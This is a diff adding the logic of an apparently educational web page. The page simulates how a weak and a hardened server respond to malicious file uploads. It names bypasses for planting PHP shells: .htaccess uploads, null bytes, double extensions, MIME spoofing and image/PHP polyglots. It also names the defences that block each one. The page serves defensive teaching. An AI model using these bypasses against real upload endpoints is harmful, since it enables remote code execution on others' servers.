+  const content=document.getElementById('content-input').value.trim();
+  const vOut=document.getElementById('vuln-out');
+  const sOut=document.getElementById('safe-out');
+  const verd=document.getElementById('verdict');
+
+  const ext=getExt(fname);
+  const isHtaccess=fname==='.htaccess'||fname.endsWith('/.htaccess');
+  const hasPhp=hasPhpCode(content);
+  const hasMagic=hasMagicBytes(content);
+  const isMimeSpoofed=mime.startsWith('image/')&&hasPhp;
+  const hasNullByte=fname.includes('\0');
+  const isDoubleExt=fname.includes('.')&&fname.split('.').length>2&&!isPhpExt(ext);
+  const isPhp=isPhpExt(ext)||isPhpExt(fname.split('.').slice(-2,-1)[0]||'');
+  const isLegit=!hasPhp&&hasMagic&&['jpg','jpeg','png','gif','webp'].includes(ext);
+
+  // Vulnerable server: only checks extension blocklist
+  let vulnResult='',vulnRce=false,safeResult='',safeBlocked=false;
+
+  if(isLegit){
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/${fname}",\n  "url": "https://target.com/uploads/${fname}"\n}`;
+    safeResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/a3f1b2c4-d5e6.jpg"\n}`;
+  } else if(isHtaccess){
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/.htaccess",\n  "note": "Apache now executes .jpg as PHP in /uploads/!\n           Upload shell.jpg next for RCE."\n}`;
+    vulnRce=true;
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": ".htaccess uploads not permitted"\n}`;
+    safeBlocked=true;
+  } else if(isPhp&&!isMimeSpoofed&&!hasMagic&&!hasNullByte&&!isDoubleExt){
+    // Obvious PHP — both block
+    vulnResult=`HTTP 403 Forbidden\n{\n  "error": "File type not allowed",\n  "blocked_extension": ".${ext}"\n}`;
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": "File type not allowed"\n}`;
+  } else if(hasNullByte){
+    vulnResult=`HTTP 200 OK (PHP < 5.3.4)\n{\n  "status": "uploaded",\n  "path": "/uploads/shell.php",\n  "note": "Null byte truncated .jpg — file saved as .php!"\n}`;
+    vulnRce=true;
+    safeResult=`HTTP 400 Bad Request\n{\n  "error": "Invalid filename — null bytes not permitted"\n}`;
+    safeBlocked=true;
+  } else if(isDoubleExt&&hasPhp){
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/${fname}",\n  "note": "Server extension check saw .jpg — passed!\n           Apache processes .php handler — RCE possible."\n}`;
+    vulnRce=true;
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": "PHP code detected in file content",\n  "note": "Magic bytes check passed but content scan failed"\n}`;
+    safeBlocked=true;
+  } else if(isMimeSpoofed&&!hasMagic&&hasPhp){
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/${fname}",\n  "note": "Content-Type: image/jpeg accepted — but file is PHP!"\n}`;
+    vulnRce=isPhp||fname.endsWith('.php');
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": "File content does not match claimed type",\n  "detail": "Magic bytes mismatch — Content-Type: image/jpeg but no JPEG header found"\n}`;
+    safeBlocked=true;
+  } else if(hasMagic&&hasPhp){
+    // Polyglot — magic bytes present but PHP code too
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/${fname}",\n  "note": "Magic bytes check passed (JPEG header found)!\n           PHP code embedded after header → polyglot accepted."\n}`;
+    vulnRce=true;
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": "Malicious content detected",\n  "detail": "PHP code found in image file — polyglot attack blocked",\n  "note": "Image re-encoded with PIL — payload stripped"\n}`;
+    safeBlocked=true;
+  } else if(hasPhp){
+    vulnResult=`HTTP 200 OK\n{\n  "status": "uploaded",\n  "path": "/uploads/${fname}"\n}`;
+    vulnRce=true;
+    safeResult=`HTTP 403 Forbidden\n{\n  "error": "Server-side script code detected in upload"\n}`;
+    safeBlocked=true;
+  }
+
+  vOut.innerHTML=vulnRce
+    ?`<span style="color:#f87171">${vulnResult}</span>`
+    :vulnResult;
+  sOut.innerHTML=safeBlocked
+    ?`<span style="color:#4ade80">${safeResult}</span>`
+    :`<span style="color:#4ade80">${safeResult||'HTTP 200 OK\n{\n  "status": "uploaded safely"\n}'}</span>`;
+
+  if(isLegit){
+    verd.className='result-box r-green';
+    verd.innerHTML='<strong>Legitimate file.</strong> Both servers accept this clean image. No PHP code detected, valid magic bytes.';
+  } else if(vulnRce){
+    verd.className='result-box r-red';
+    const techniques={
+      true:isHtaccess?'<code>.htaccess</code> upload — Apache now executes .jpg as PHP in the uploads dir':
+           hasNullByte?'<strong>Null byte</strong> truncated the .jpg suffix — file was saved as .php':
+           isDoubleExt?'<strong>Double extension</strong> — blocklist saw .jpg but Apache fell back to .php handler':
+           hasMagic&&hasPhp?'<strong>Polyglot file</strong> — valid JPEG magic bytes + embedded PHP code — passed magic byte check':
+           isMimeSpoofed?'<strong>MIME type spoofed</strong> — Content-Type said image/jpeg but file is PHP':'<strong>PHP shell uploaded successfully</strong>'
+    };
+    verd.innerHTML=`<strong>Upload succeeded — RCE achievable!</strong> ${techniques[true]}. Vulnerable server accepted the file. The secure server blocked it through content inspection + re-encoding.`;
+  } else {
+    verd.className='result-box r-amber';
+    verd.innerHTML='<strong>Blocked by both servers.</strong> The raw PHP extension is on the blocklist — but try the bypass presets to see how to evade it.';
+  }
+}
+
+runUpload();
+</script>
+</body>
+</html>
